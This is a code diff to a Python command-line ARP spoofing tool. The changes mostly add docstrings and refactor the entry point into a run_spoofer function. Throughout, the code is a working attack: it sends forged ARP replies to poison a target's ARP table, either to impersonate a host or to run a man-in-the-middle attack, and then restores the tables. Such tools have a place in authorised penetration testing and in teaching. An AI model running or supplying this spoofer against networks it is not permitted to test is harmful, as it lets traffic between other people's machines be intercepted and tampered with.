@@ -9,10 +9,14 @@
 import kamene.all as sp
 import argparse
 from time import sleep
-from colors import *
+from UI.colors import *
 from sys import exit
 
+
 def get_args():
+	'''
+	get arguments from command line.
+	'''
 	parser = argparse.ArgumentParser('ARP spoofer')
 	parser.add_argument('-t', '--target', dest = 'target', help='target ip')
 	parser.add_argument('-s', '--spoof', dest = 'spoof', help='spoof ip')
@@ -28,20 +32,29 @@ def get_args():
 
 
 def check_args(target_ip, spoof_ip):
-    if not target_ip:
-        exit(BRIGHT_RED + "[-] Please enter target ip as argument, use -h or --help for more info")
-    elif not spoof_ip:
-        exit(BRIGHT_RED + "[-] Please enter spoof ip as argument, use -h or --help for more info")
- 
-    return True
+	'''
+	checks if arguments fetched are valid.
+	'''
+	if not target_ip:	
+	    exit(BRIGHT_RED + "[-] Please enter target ip as argument, use -h or --help for more info")
+	elif not spoof_ip:
+	    exit(BRIGHT_RED + "[-] Please enter spoof ip as argument, use -h or --help for more info")
+	
+	return True
 
 
 def generate_packet(PDST, HWDST, PSRC):
+	'''
+	generates spoof packets.
+	'''
 	packet = sp.ARP(op=2, pdst=PDST, hwdst = HWDST, psrc = PSRC)
 	return packet
 
 
 def get_mac(ip):
+	'''
+	retrieves mac address from the ip.
+	'''
 	try:
 		arp_req = sp.ARP(pdst=ip)
 		brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
@@ -58,6 +71,9 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip, args_status):
+	'''
+	spoof target with spoof ip mac.
+	'''
 	if args_status:
 		target_mac = get_mac(target_ip)
 		PACKET = generate_packet(target_ip, target_mac, spoof_ip)
@@ -67,6 +83,9 @@ def spoof(target_ip, spoof_ip, args_status):
 
 
 def mitm(target_ip, spoof_ip, args_status):
+	'''
+	performs man in the middle attack by arp poisoning.
+	'''
 	print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
 	packets_sent = 0
 	is_attacking = True
@@ -83,6 +102,9 @@ def mitm(target_ip, spoof_ip, args_status):
 
 
 def spoof_only(target_ip, spoof_ip, args_status):
+	'''
+	only spoofs the specified target.
+	'''
 	print(BRIGHT_YELLOW +  f'[+] Spoofing {target_ip} as {spoof_ip}....')
 	
 	packets_sent = 0
@@ -99,6 +121,9 @@ def spoof_only(target_ip, spoof_ip, args_status):
 
 
 def restore_default_table(dst_ip, src_ip):
+	'''
+	restore default arp table of spoofed targets.
+	'''
 	try:
 		dst_mac = get_mac(dst_ip)
 		src_mac = get_mac(src_ip)
@@ -110,17 +135,29 @@ def restore_default_table(dst_ip, src_ip):
 		raise(e)
 
 
-TARGET_IP, SPOOF_IP, MITM= get_args()
-ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)
+def run_spoofer(target_ip, spoof_ip, perform_mitm):
+	'''
+	start spoofer.
+	'''
+	TARGET_IP, SPOOF_IP, MITM = target_ip, spoof_ip, perform_mitm
+	ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)
 
-if MITM == '1':
-	mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
-else:
-	spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)
+	if MITM == '1' or MITM:
+		print(BRIGHT_YELLOW + '[*] Performing MITM attack...')
+		mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
+	else:
+		print(BRIGHT_YELLOW + f'[*] Performing Spoof Only on {TARGET_IP} as {SPOOF_IP}...')
+		spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)
 
 
-print(BRIGHT_YELLOW + '[+] Restoring default table for target and gateway....')
-restore_default_table(TARGET_IP, SPOOF_IP)
-restore_default_table(SPOOF_IP, TARGET_IP)
+	print(BRIGHT_YELLOW + '[+] Restoring default table for target and gateway....')
+	restore_default_table(TARGET_IP, SPOOF_IP)
+	restore_default_table(SPOOF_IP, TARGET_IP)
 
-print(BRIGHT_RED +'[+] Closing Program...')
+	print(BRIGHT_RED +'[+] Closing ARPSPOOFER...')
+
+
+if __name__ == '__main__':
+	TARGET_IP, SPOOF_IP, MITM = get_args()
+	run_spoofer(TARGET_IP, SPOOF_IP, MITM)
+	
